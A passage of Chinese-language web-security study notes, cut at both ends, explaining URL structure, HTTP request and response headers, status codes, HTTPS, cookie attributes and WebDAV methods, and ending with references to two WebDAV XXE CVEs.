width: 1000px; height: 1em; outline: none;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 28px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: none;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre><div class="CodeMirror-linenumber CodeMirror-gutter-elt"><div>8</div></div></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: -28px; width: 28px;"></div><div class="CodeMirror-gutter-wrapper CodeMirror-activeline-gutter" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">1</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">-协议类型：常见的有http、https，还有ftp、file、mailto、data等。</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">2</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">-用户名、密码：这没什么好解释的，就是字面意思。</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">3</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">-服务器地址：有的时候你在URL上看到的是域名，其实会通过DNS转为IP地址，所以还是服务器IP地址。</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">4</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">-端口号：常见80、443、21、22等。</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">5</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">-资源层级文件路径：大部分会隐藏，就是服务器的目录路径，使用"/"区别每一层。</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">6</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">-文件名：如访问网页，可能是xxx.htm、xxx.html、xxx.php等，例如，index.html。</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt" style="left: 0px; width: 19px;">7</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">-查询：使用"&amp;"连接</span></pre></div><div style="position: relative;"><div class="CodeMirror-gutter-wrapper" style="left: -28px;"><div class="CodeMirror-linenumber CodeMirror-gutter-elt CodeMirror-linenumber-show" style="left: 0px; width: 19px;">8</div></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">-片段ID：有的时候被称为“锚点”，一般是指CSS中的id，就是使用浏览器调试时看到的id属性，有时也可通过这个进行XSS或sql注入。</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom: 0px solid transparent; top: 204px;"></div><div class="CodeMirror-gutters" style="height: 204px;"><div class="CodeMirror-gutter CodeMirror-linenumbers" style="width: 27px;"></div></div></div></div></pre></li><li><p><span>其中[用户名[：密码]]、[端口号]、[查询]、[片段ID]都属于选填项。</span></p></li></ul><h4 id='请求头列表'><span>请求头列表</span></h4><ul><li><p><strong><span>Accept</span></strong></p><ul><li><span>指定客户端能够接收的内容类型</span></li><li><span>Accept: text/plain, text/html</span></li></ul></li><li><p><strong><span>Accept-Charset</span></strong></p><ul><li><span>浏览器可以接受的字符编码集</span></li><li><span>Accept-Charset: iso-8859-5</span></li></ul></li><li><p><strong><span>Accept-Encoding</span></strong></p><ul><li><span>指定浏览器可以支持的 web 服务器返回内容压缩编码类型</span></li><li><span>Accept-Encoding: compress, gzip</span></li></ul></li><li><p><strong><span>Accept-Language</span></strong></p><ul><li><span>浏览器可接受的语言</span></li><li><span>Accept-Language: en,zh</span></li></ul></li><li><p><strong><span>Accept-Ranges</span></strong></p><ul><li><span>可以请求网页实体的一个或者多个子范围字段</span></li><li><span>Accept-Ranges: bytes</span></li></ul></li><li><p><strong><span>Authorization</span></strong></p><ul><li><span>HTTP 授权的授权证书</span></li><li><span>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</span></li></ul></li><li><p><strong><span>Cache-Control</span></strong></p><ul><li><span>指定请求和响应遵循的缓存机制 Cache-Control: no-cache</span></li></ul></li><li><p><strong><span>Connection</span></strong></p><ul><li><span>表示是否需要持久连接 // HTTP 1.1 默认进行持久连接</span></li><li><span>Connection: close</span></li></ul></li><li><p><strong><span>Cookie</span></strong></p><ul><li><span>HTTP 请求发送时，会把保存在该请求域名下的所有 cookie 值一起发送给 web 服务器</span></li><li><span>Cookie: role=admin;ssid=1</span></li></ul></li><li><p><strong><span>Content-Length</span></strong></p><ul><li><span>请求的内容长度</span></li><li><span>Content-Length: 348</span></li></ul></li><li><p><strong><span>Content-Type</span></strong></p><ul><li><span>请求的与实体对应的 MIME 信息</span></li><li><span>Content-Type: application/x-www-form-urlencoded</span></li></ul></li><li><p><strong><span>Date</span></strong></p><ul><li>&nbsp;<span>请求发送的日期和时间</span></li><li><span>Date: Tue, 15 Nov 2010 08:12:31 GMT</span></li></ul></li><li><p><strong><span>Expect</span></strong></p><ul><li><span>请求的特定的服务器行为</span></li><li><span>Expect: 100-continue</span></li></ul></li><li><p><strong><span>From</span></strong></p><ul><li><span>发出请求的用户的 Email</span></li><li><span>From: </span><a href='mailto:user@email.com' target='_blank' class='url'>user@email.com</a></li></ul></li><li><p><strong><span>Host</span></strong></p><ul><li><span>指定请求的服务器的域名和端口号</span></li><li><span>Host: </span><a href='http://www.github.com/'><span>www.github.com</span></a></li></ul></li><li><p><strong><span>If-Match</span></strong></p><ul><li><span>只有请求内容与实体相匹配才有效</span></li><li><span>If-Match: </span>“<span>737060cd8c284d8af7ad3082f209582d</span>”</li></ul></li><li><p><strong><span>If-Modified-Since</span></strong></p><ul><li><span>如果请求的部分在指定时间之后被修改则请求成功，未被修改则返回 304 代码</span></li><li><span>If-Modified-Since: Sat, 29 Oct 2018 19:43:31 GMT</span></li></ul></li><li><p><strong><span>If-None-Match</span></strong></p><ul><li><span>如果内容未改变返回 304 代码，参数为服务器先前发送的 Etag，与服务器回应的 Etag 比较判断是否改</span></li><li><span>If-None-Match: </span>“<span>737060cd8c284d8af7ad3082f209582d</span>”</li></ul></li><li><p><strong><span>If-Range</span></strong></p><ul><li><span>如果实体未改变，服务器发送客户端丢失的部分，否则发送整个实体。参数也为 Etag</span></li><li><span>If-Range: </span>“<span>737060cd8c284d8af7ad3082f209582d</span>”</li></ul></li><li><p><strong><span>If-Unmodified-Since</span></strong></p><ul><li><span>只在实体在指定时间之后未被修改才请求成功</span></li><li><span>If-Unmodified-Since: Sat, 29 Oct 2010 19:43:31 GMT</span></li></ul></li><li><p><strong><span>Max-Forwards</span></strong></p><ul><li><span>限制信息通过代理和网关传送的时间</span></li><li><span>Max-Forwards: 10</span></li></ul></li><li><p><strong><span>Pragma</span></strong></p><ul><li><span>用来包含实现特定的指令</span></li><li><span>Pragma: no-cache</span></li></ul></li><li><p><strong><span>Proxy-Authorization</span></strong></p><ul><li><span>连接到代理的授权证书</span></li><li><span>Proxy-Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</span></li></ul></li><li><p><strong><span>Range</span></strong></p><ul><li><span>只请求实体的一部分，指定范围</span></li><li><span>Range: bytes=500-999</span></li></ul></li><li><p><strong><span>Referer</span></strong></p><ul><li><span>先前网页的地址，当前请求网页紧随其后, 即来路</span></li><li><span>Referer: </span><a href='http://www.zcmhi.com/archives/71.html' target='_blank' class='url'>http://www.zcmhi.com/archives/71.html</a></li></ul></li><li><p><strong><span>TE</span></strong></p><ul><li><span>客户端愿意接受的传输编码，并通知服务器接受接受尾加头信息</span></li><li><span>TE: trailers,deflate;q=0.5</span></li></ul></li><li><p><strong><span>Upgrade</span></strong></p><ul><li><span>向服务器指定某种传输协议以便服务器进行转换（如果支持）</span></li><li><span>Upgrade: HTTP/2.0, SHTTP/1.3, IRC/6.9, RTA/x11</span></li></ul></li><li><p><strong><span>User-Agent</span></strong></p><ul><li><span>User-Agent 的内容包含发出请求的用户信息</span></li><li><span>User-Agent: Mozilla/5.0 (Linux; X11)</span></li></ul></li><li><p><strong><span>Via</span></strong></p><ul><li><span>通知中间网关或代理服务器地址，通信协议</span></li><li><span>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</span></li></ul></li><li><p><strong><span>Warning</span></strong></p><ul><li><span>关于消息实体的警告信息</span></li><li><span>Warn: 199 Miscellaneous warning</span></li></ul></li></ul><h4 id='响应头列表'><span>响应头列表</span></h4><ul><li><p><strong><span>Accept-Ranges</span></strong></p><ul><li><span>表明服务器是否支持指定范围请求及哪种类型的分段请求</span></li><li><span>Accept-Ranges: bytes</span></li></ul></li><li><p><strong><span>Access-Control-Allow-Origin</span></strong></p><ul><li><span>配置有权限访问资源的域</span></li><li><span>Access-Control-Allow-Origin: </span><span>&lt;</span><span>origin</span><span>&gt;</span><span>|</span><span>*</span></li></ul></li><li><p><strong><span>Age</span></strong></p><ul><li><span>从原始服务器到代理缓存形成的估算时间（以秒计，非负）</span></li><li><span>Age: 12</span></li></ul></li><li><p><strong><span>Allow</span></strong></p><ul><li><span>服务器支持哪些请求方法（如GET、POST等），不允许则返回 405</span></li><li><span>Allow: GET, HEAD</span></li></ul></li><li><p><strong><span>Cache-Control</span></strong></p><ul><li><span>告诉所有的缓存机制是否可以缓存及哪种类型</span></li><li><span>Cache-Control: no-cache</span></li></ul></li><li><p><strong><span>Content-Encoding</span></strong></p><ul><li><span>web 服务器支持的返回内容压缩编码类型。文档的编码（Encode）方法。只有在解码之后才可以得到Content-Type头指定的内容类型。利用gzip压缩文档能够显著地减少HTML文档的下载时间。Java的GZIPOutputStream可以很方便地进行gzip压缩，但只有Unix上的Netscape和Windows上的IE 4、IE 5才支持它。因此，Servlet应该通过查看Accept-Encoding头（即request.getHeader(</span>“<span>Accept-Encoding</span>”<span>)）检查浏览器是否支持gzip，为支持gzip的浏览器返回经gzip压缩的HTML页面，为其他浏览器返回普通页面。</span></li><li><span>Content-Encoding: gzip</span></li></ul></li><li><p><strong><span>Content-Language</span></strong></p><ul><li><span>响应体的语言</span></li><li><span>Content-Language: en,zh</span></li></ul></li><li><h5 id='content-length'><strong><span>Content-Length</span></strong></h5><ul><li><span>响应体内容长度。只有当浏览器使用持久HTTP连接时才需要这个数据。如果你想要利用持久连接的优势，可以把输出文档写入 ByteArrayOutputStream，完成后查看其大小，然后把该值放入Content-Length头，最后通过byteArrayStream.writeTo(response.getOutputStream()发送内容。</span></li><li><span>Content-Length: 348</span></li></ul></li><li><p><strong><span>Content-Location</span></strong></p><ul><li><span>请求资源可替代的备用的另一地址</span></li><li><span>Content-Location: /index.htm</span></li></ul></li><li><p><strong><span>Content-MD5</span></strong></p><ul><li><span>返回资源的 MD5 校验值</span></li><li><span>Content-MD5: Q2hlY2sgSW50ZWdyaXR5IQ==</span></li></ul></li><li><p><strong><span>Content-Range</span></strong></p><ul><li><span>在整个返回体中本部分的字节位置</span></li><li><span>Content-Range: bytes 21010-47021/47022</span></li></ul></li><li><p><strong><span>Content-Type</span></strong></p><ul><li><span>返回内容的 MIME 类型，表示后面的文档属于什么MIME类型。Servlet默认为text/plain，但通常需要显式地指定为text/html。由于经常要设置Content-Type，因此HttpServletResponse提供了一个专用的方法setContentType。</span></li><li><span>Content-Type: text/html; charset=utf-8</span></li></ul></li><li><p><strong><span>Date</span></strong></p><ul><li><span>当前的GMT时间（原始服务器消息发出的时间）。你可以用setDateHeader来设置这个头以避免转换时间格式的麻烦。</span></li><li><span>Date: Tue, 15 Nov 2010 08:12:31 GMT</span></li></ul></li><li><p><strong><span>ETag</span></strong></p><ul><li><span>请求变量的实体标签的当前值</span></li><li><span>ETag: </span>“<span>737060cd8c284d8af7ad3082f209582d</span>”</li></ul></li><li><p><strong><span>Expires</span></strong></p><ul><li><span>响应过期的日期和时间（应该在什么时候认为文档已经过期，从而不再缓存它？）</span></li><li><span>Expires: Thu, 01 Dec 2010 16:00:00 GMT</span></li></ul></li><li><p><strong><span>Last-Modified</span></strong></p><ul><li><span>请求资源的最后修改时间（文档的最后改动时间）。客户可以通过If-Modified-Since请求头提供一个日期，该请求将被视为一个条件GET，只有改动时间迟于指定时间的文档才会返回，否则返回一个304（Not Modified）状态。Last-Modified也可用setDateHeader方法来设置。</span></li><li><span>Last-Modified: Tue, 15 Nov 2010 12:45:26 GMT</span></li></ul></li><li><p><strong><span>Location</span></strong></p><ul><li><span>重定向接收方到非请求 URL 的位置来完成请求或标识新的资源，表示客户应当到哪里去提取文档。Location通常不是直接设置的，而是通过HttpServletResponse的sendRedirect方法，该方法同时设置状态代码为302。</span></li><li><span>Location: </span><a href='http://www.zcmhi.com/archives/94.html' target='_blank' class='url'>http://www.zcmhi.com/archives/94.html</a></li></ul></li><li><p><strong><span>Pragma</span></strong></p><ul><li><span>包括实现特定的指令，它可应用到响应链上的任何接收方</span></li><li><span>Pragma: no-cache</span></li></ul></li><li><p><strong><span>Proxy-Authenticate</span></strong></p><ul><li><span>它指出认证方案和可应用到代理的该 URL 上的参数</span></li><li><span>Proxy-Authenticate: Basic</span></li></ul></li><li><p><strong><span>Refresh</span></strong></p><ul><li><span>表示浏览器应该在多少时间之后刷新文档，以秒计。除了刷新当前文档之外，你还可以通过setHeader(</span>“<span>Refresh</span>”<span>, </span>“<span>5; URL=</span><a href='http://host/path' target='_blank' class='url'>http://host/path</a>”<span>)让浏览器读取指定的页面。</span></li><li><span>注意这种功能通常是通过设置HTML页面HEAD区的＜META HTTP-EQUIV=</span>“<span>Refresh</span>”<span> CONTENT=</span>“<span>5;URL=</span><a href='http://host/path' target='_blank' class='url'>http://host/path</a>”<span>＞实现，这是因为，自动刷新或重定向对于那些不能使用CGI或Servlet的HTML编写者十分重要。但是，对于Servlet来说，直接设置Refresh头更加方便。</span></li><li><span>注意Refresh的意义是</span>“<span>N秒之后刷新本页面或访问指定页面</span>”<span>，而不是</span>“<span>每隔N秒刷新本页面或访问指定页面</span>”<span>。因此，连续刷新要求每次都发送一个Refresh头，而发送204状态代码则可以阻止浏览器继续刷新，不管是使用Refresh头还是＜META HTTP-EQUIV=</span>“<span>Refresh</span>”<span> </span>…<span>＞。</span></li><li><span>注意Refresh头不属于HTTP 1.1正式规范的一部分，而是一个扩展，但Netscape和IE都支持它。</span></li><li><span>Refresh: 5; url=</span><a href='http://www.zcmhi.com/archives/94.html'><span>http://www.zcmhi.com/archives/94.html</span></a></li></ul></li><li><p><strong><span>Retry-After</span></strong></p><ul><li><span>如果实体暂时不可取，通知客户端在指定时间之后再次尝试</span></li><li><span>Retry-After: 120</span></li></ul></li><li><p><strong><span>Server</span></strong></p><ul><li><span>web 服务器软件名称。Servlet一般不设置这个值，而是由Web服务器自己设置。</span></li><li><span>Server: Apache/1.3.27 (Unix) (Red-Hat/Linux)</span></li></ul></li><li><p><strong><span>Set-Cookie</span></strong></p><ul><li><span>设置和页面关联的Cookie。Servlet不应使用response.setHeader(</span>“<span>Set-Cookie</span>”<span>, </span>…<span>)，而是应使用HttpServletResponse提供的专用方法addCookie。参见下文有关Cookie设置的讨论。</span></li><li><span>设置 Http Cookie Set-Cookie: UserID=JohnDoe; Max-Age=3600; Version=1</span></li></ul></li><li><p><strong><span>Strict-Transport-Security</span></strong></p><ul><li><span>设置浏览器强制使用 HTTPS 访问</span></li><li><span>max-age: x 秒的时间内访问对应域名都使用 HTTPS 请求</span></li><li><span>includeSubDomains: 网站的子域名也启用规则</span></li><li><span>Strict-Transport-Security: max-age=1000; includeSubDomains</span></li></ul></li><li><p><strong><span>Trailer</span></strong></p><ul><li><span>指出头域在分块传输编码的尾部存在 Trailer: Max-Forwards</span></li></ul></li><li><p><strong><span>Transfer-Encoding</span></strong></p><ul><li><span>文件传输编码</span></li><li><span>Transfer-Encoding:chunked</span></li></ul></li><li><p><strong><span>Vary</span></strong></p><ul><li><span>告诉下游代理是使用缓存响应还是从原始服务器请求</span></li><li><span>Vary: </span><span>\</span><span>*</span></li></ul></li><li><p><strong><span>Via</span></strong></p><ul><li><span>告知代理客户端响应是通过哪里发送的</span></li><li><span>Via: 1.0 fred, 1.1 nowhere.com (Apache/1.1)</span></li></ul></li><li><p><strong><span>Warning</span></strong></p><ul><li><span>警告实体可能存在的问题</span></li><li><span>Warning: 199 Miscellaneous warning</span></li></ul></li><li><p><strong><span>WWW-Authenticate</span></strong></p><ul><li><span>表明客户端请求实体应该使用的授权方案，客户应该在Authorization头中提供什么类型的授权信息。在包含401（Unauthorized）状态行的应答中这个头是必需的。例如，response.setHeader(</span>“<span>WWW-Authenticate</span>”<span>, </span>“<span>BASIC realm=＼</span>”<span>executives＼</span>“”<span>)。</span></li><li><span>注意Servlet一般不进行这方面的处理，而是让Web服务器的专门机制来控制受密码保护页面的访问（例如.htaccess）</span></li><li><span>WWW-Authenticate: Basic</span></li></ul></li><li><h5 id='x-content-type-options'><span>X-Content-Type-Options</span></h5><ul><li><span>配置禁止 MIME 类型嗅探</span></li><li><span>X-Content-Type-Options: nosniff</span></li></ul></li><li><p><strong><span>X-Frame-Options</span></strong></p><ul><li><span>配置页面是否能出现在 </span><span>&lt;</span><span>frame</span><span>&gt;</span><span>, </span><span>&lt;</span><span>iframe</span><span>&gt;</span><span>, </span><span>&lt;</span><span>embed</span><span>&gt;</span><span>, </span><span>&lt;</span><span>object</span><span>&gt;</span><span> 等标签中，防止点击劫持</span></li><li><strong><span>1. DENY</span></strong>
<span>表示该页面不允许在iframe中展示，即便是在相同域名的页面中嵌套也不允许。nginx配置示例：add_header X-Frame-Options DENY;</span></li><li><strong><span>2. SAMEORIGIN</span></strong>
<span>表示该页面可以在相同域名页面的frame中展示。nginx配置示例：add_header X-Frame-Options SAMEORIGIN;</span></li><li><strong><span>3. ALLOW-FROM url</span></strong><span> </span>
<span>表示该页面可以在指定来源的frame中展示。nginx配置示例：add_header X-Frame-Options </span>‘<span>ALLOW-FROM </span><a href='https://xxx.xxxxxx.com' target='_blank' class='url'>https://xxx.xxxxxx.com</a>’<span>;</span></li><li><strong><span>4. ALLOWALL</span></strong>
<span>表示该页面允许全部来源域名的frame展示。nginx配置示例：add_header X-Frame-Options ALLOWALL;</span></li><li><span>X-Frame-Options: deny</span></li></ul></li><li><p><strong><span>X-XSS-Protection</span></strong></p><ul><li><span>配置 XSS 防护机制</span></li><li><span>X-XSS-Protection: 1; mode=block</span></li></ul></li></ul><h4 id='http-状态返回代码-1xx临时响应）'><span>HTTP 状态返回代码 1xx（临时响应）</span></h4><p><span>表示临时响应并需要请求者继续执行操作的状态代码。</span></p><blockquote><figure><table><thead><tr><th style='text-align:center;' ><span>Code</span></th><th style='text-align:center;' ><span>代码</span></th><th style='text-align:center;' ><span>说明</span></th></tr></thead><tbody><tr><td style='text-align:center;' ><span>100</span></td><td style='text-align:center;' ><span>继续（Coutinue）</span></td><td style='text-align:center;' ><span>服务器返回此代码表示已收到请求的第一部分，正在等待其余部分，</span><a href='http://www.dreamdu.com/webbuild/client_vs_server/'><span>客户端</span></a><span>应继续其请求</span></td></tr><tr><td style='text-align:center;' ><span>101</span></td><td style='text-align:center;' ><span>切换协议（Switching Protocols）</span></td><td style='text-align:center;' ><span>请求者已要求服务器切换协议，服务器已确认并准备切换</span></td></tr></tbody></table></figure></blockquote><h4 id='http-状态返回代码-2xx-成功）'><span>HTTP 状态返回代码 2xx （成功）</span></h4><p><span>操作被成功接收并处理</span></p><figure><table><thead><tr><th style='text-align:center;' ><span>Code</span></th><th style='text-align:center;' ><span>代码</span></th><th style='text-align:center;' ><span>说明</span></th></tr></thead><tbody><tr><td style='text-align:center;' ><span>200</span></td><td style='text-align:center;' ><span>成功（OK）</span></td><td style='text-align:center;' ><span>服务器已成功处理了请求。通常，这表示服务器提供了请求的网页</span></td></tr><tr><td style='text-align:center;' ><span>201</span></td><td style='text-align:center;' ><span>已创建（Created）</span></td><td style='text-align:center;' ><span>请求成功并创建了新的资源</span></td></tr><tr><td style='text-align:center;' ><span>202</span></td><td style='text-align:center;' ><span>已接受（Accepted）</span></td><td style='text-align:center;' ><span>服务器已接受请求，但尚未处理完成</span></td></tr><tr><td style='text-align:center;' ><span>203</span></td><td style='text-align:center;' ><span>非授权信息（Non-Authoritative Information）</span></td><td style='text-align:center;' ><span>服务器已成功处理了请求，但返回的meta信息不在原始的服务器，而是一个副本</span></td></tr><tr><td style='text-align:center;' ><span>204</span></td><td style='text-align:center;' ><span>无内容（No Content）</span></td><td style='text-align:center;' ><span>服务器成功处理了请求，但没有返回任何内容。在未更新网页的情况下，可确保浏览器继续显示当前文档</span></td></tr><tr><td style='text-align:center;' ><span>205</span></td><td style='text-align:center;' ><span>重置内容（Reset Content）</span></td><td style='text-align:center;' ><span>服务器成功处理了请求，用户终端（例如：浏览器）应重置文档视图。可通过此返回码清除浏览器的表单域</span></td></tr><tr><td style='text-align:center;' ><span>206</span></td><td style='text-align:center;' ><span>部分内容（Partial Content）</span></td><td style='text-align:center;' ><span>服务器成功处理了部分 GET 请求</span></td></tr></tbody></table></figure><h4 id='http-状态返回代码-3xx-重定向）'><span>HTTP 状态返回代码 3xx （重定向）</span></h4><blockquote><p><span>表示要完成请求，需要进一步操作。通常，这些状态代码用来重定向。</span></p></blockquote><figure><table><thead><tr><th><span>Code</span></th><th><span>代码</span></th><th><span>说明</span></th></tr></thead><tbody><tr><td><span>300</span></td><td><span>多种选择（Multiple Choices）</span></td><td><span>针对请求，服务器可执行多种操作。服务器可根据请求者 (user agent) 选择一项操作，或提供操作列表供请求者选择。</span></td></tr><tr><td><span>301</span></td><td><span>永久移动（Moved Permanently）</span></td><td><span>请求的网页已永久移动到新位置。服务器返回此响应（对 GET 或 HEAD 请求的响应）时，会自动将请求者转到新位置。今后任何新的请求都应使用新的URI代替</span></td></tr><tr><td><span>302</span></td><td><span>临时移动（Found）</span></td><td><span>与301类似。但资源只是临时被移动，客户端应继续使用原有URI。服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</span></td></tr><tr><td><span>303</span></td><td><span>查看其它位置（See Other）</span></td><td><span>与301类似，请求者应当对不同的位置使用单独的 GET 请求来检索响应时，服务器返回此代码。</span></td></tr><tr><td><span>304</span></td><td><span>未修改（Not Modified）</span></td><td><span>自从上次请求后，请求的网页未修改过。服务器返回此响应时，不会返回网页内容。客户端通常会缓存访问过的资源，通过提供一个头信息指出客户端希望只返回在指定日期之后修改的资源</span></td></tr><tr><td><span>305</span></td><td><span>使用代理（Use Proxy）</span></td><td><span>请求者只能使用代理访问请求的网页。如果服务器返回此响应，还表示请求者应使用代理。</span></td></tr><tr><td><span>306</span></td><td><span>已弃用</span></td><td>&nbsp;</td></tr><tr><td><span>307</span></td><td><span>临时重定向（Temporary Redirect）</span></td><td><span>与302类似，服务器目前从不同位置的网页响应请求，但请求者应继续使用原有位置来进行以后的请求。</span></td></tr></tbody></table></figure><h4 id='http-状态返回代码-4xx请求错误）'><span>HTTP 状态返回代码 4xx（请求错误）</span></h4><p><span>客户端错误，请求包含语法错误或无法完成请求。这些状态代码表示请求可能出错，妨碍了服务器的处理。</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220422203509992.png" referrerpolicy="no-referrer" alt="image-20220422203509992"></p><h4 id='http-状态返回代码-5xx服务器错误）'><span>HTTP 状态返回代码 5xx（服务器错误）</span></h4><p><span>这些状态代码表示服务器在尝试处理请求时发生内部错误。这些错误可能是服务器本身的错误，而不是请求出错。</span></p><p><img src="C:/Users/86184/AppData/Roaming/Typora/typora-user-images/image-20220422203622760.png" referrerpolicy="no-referrer" alt="image-20220422203622760"></p><h3 id='273--https'><span>2.7.3  HTTPS</span></h3><h4 id='简介-6'><span>简介</span></h4><blockquote><p><span>HTTPS (HyperText Transfer Protocol over Secure Socket Layer) 可以理解为 HTTP+SSL/TLS，即 HTTP下加入 SSL 层，HTTPS 的安全基础是 SSL。</span></p></blockquote><h4 id='交互'><span>交互</span></h4><h5 id='证书验证阶段'><span>证书验证阶段</span></h5><ul><li><p><span>浏览器发起 HTTPS 请求</span></p></li><li><p><span>服务端返回 HTTPS 证书</span></p></li><li><p><strong><span>其中证书包含：</span></strong></p><ul><li><span>颁发机构信息</span></li><li><span>公钥</span></li><li><span>公司信息</span></li><li><span>域名</span></li><li><span>有效期</span></li><li><span>指纹</span></li></ul></li><li><p><span>客户端验证证书是否合法，如果不合法则提示告警</span></p></li></ul><h5 id='数据传输阶段'><span>数据传输阶段</span></h5><ul><li><span>当证书验证合法后，在本地生成随机数</span></li><li><span>通过公钥加密随机数，并把加密后的随机数传输到服务端</span></li><li><span>服务端通过私钥对随机数进行解密</span></li><li><span>服务端通过客户端传入的随机数构造对称加密算法，对返回结果内容进行加密后传输</span></li></ul><h4 id='ca'><span>CA</span></h4><blockquote><p><span>CA (Certificate Authority) 是颁发数字证书的机构。是负责发放和管理数字证书的权威机构，并作为电子商务交易中受信任的第三方，承担公钥体系中公钥的合法性检验的责任。</span></p></blockquote><h3 id='274--cookie'><span>2.7.4  Cookie</span></h3><h4 id='简介-7'><span>简介</span></h4><blockquote><p><span>Cookie（复数形态 Cookies），类型为「小型文本文件」，指某些网站为了辨别用户身份而储存在用户本地终端上的数据。</span></p></blockquote><h4 id='属性'><span>属性</span></h4><h5 id='namecookie-的名称）'><span>name（cookie 的名称）</span></h5><h5 id='value'><span>value</span></h5><blockquote><p><span>cookie 的值。</span></p></blockquote><h5 id='expires'><span>expires</span></h5><ul><li><span>当 Expires 属性缺省时，表示是会话性 Cookie，在用户关闭浏览器时失效。</span></li></ul><h5 id='max-age'><span>max-age</span></h5><blockquote><p><span>max-age 可以为正数、负数、0。如果 max-age 属性为正数时，浏览器会将其持久化，当 max-age 属性为负数，则表示该 Cookie 只是一个会话性 Cookie。当 max-age 为 0 时，则会立即删除这个 Cookie。Expires 和 max-age 都存在的条件下，max-age 优先级更高。</span></p></blockquote><h5 id='domain'><span>domain</span></h5><blockquote><p><span>指定 Cookie 的域名，默认是当前域名。domain 设置时可以设置为自身及其父域，子域可以访问父域的</span></p><p><span>Cookie，反之不能。</span></p></blockquote><h5 id='path'><span>path</span></h5><blockquote><p><span>指定一个 URL 路径，这个路径必须出现在要请求的资源的路径中才可以发送对应的 Cookie。</span></p></blockquote><h5 id='secure'><span>secure</span></h5><blockquote><p><span>只能通过 HTTPS 传输。</span></p></blockquote><h5 id='httponly-1'><span>httponly</span></h5><blockquote><p><span>限制 Cookie 仅在 HTTP 传输过程中被读取，一定程度上防御 XSS 攻击。</span></p></blockquote><h5 id='samesite'><span>SameSite</span></h5><blockquote><p><span>SameSite 支持 Strict / Lax / None 三种值。Strict 最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。Lax 允许部分第三方请求携带 Cookie，主要是链接、预加载、GET 表单三种情况。 Cookie 的 SameSite 属性为 None ， 设置了 Secure 时，无论是否跨站都会发送 Cookie。</span></p></blockquote><h3 id='275--webdav'><span>2.7.5  WebDAV</span></h3><h4 id='简介-8'><span>简介</span></h4><blockquote><p><span>WebDAV （Web-based Distributed Authoring and Versioning）一种基于 HTTP 1.1 协议的通信协议。它扩展了 HTTP 1.1，在 GET、POST、HEAD 等几个 HTTP 标准方法以外添加了一些新的方法，使应用程序可对 Web Server 直接读写，并支持写文件锁定、解锁，以及版本控制等功能。</span></p><p><span>支持的方法具体为：</span></p></blockquote><ul><li><h6 id='options'><span>OPTIONS</span></h6><ul><li><span>获取服务器的支持</span></li></ul></li><li><h6 id='get--put--post--delete'><span>GET / PUT / POST / DELETE</span></h6><ul><li><span>资源操作</span></li></ul></li><li><h6 id='trace'><span>TRACE</span></h6><ul><li><span>跟踪服务器</span></li></ul></li><li><h6 id='head'><span>HEAD</span></h6></li><li><h6 id='mkcol'><span>MKCOL</span></h6><ul><li><span>创建集合</span></li></ul></li><li><h6 id='propfind--proppatch'><span>PROPFIND / PROPPATCH</span></h6></li><li><h6 id='copy--move'><span>COPY / MOVE</span></h6></li><li><h6 id='lock--unlock'><span>LOCK / UNLOCK</span></h6></li></ul><h4 id='相关-cve-2'><span>相关 CVE</span></h4><ul><li><p><strong><span>CVE-2015-1833</span></strong></p><ul><li><span>Apache Jacrabbit WebDav XXE</span></li><li><a href='http://www.securityfocus.com/archive/1/535582' target='_blank' class='url'>http://www.securityfocus.com/archive/1/535582</a></li></ul></li><li><p><strong><span>CVE-2015-7326</span></strong></p></li><li><p><span>Milton WebDav XXE</span></p></li><li><p><a href='http://www.securityfocus.com/archive/1/536813' target='_blank' class='url'>http://www.securityfocus.com/archive/1/536813</a></p></li></ul><h3 id='276--参考链接'><span>2.7.6  参考链接</span></h3><h4 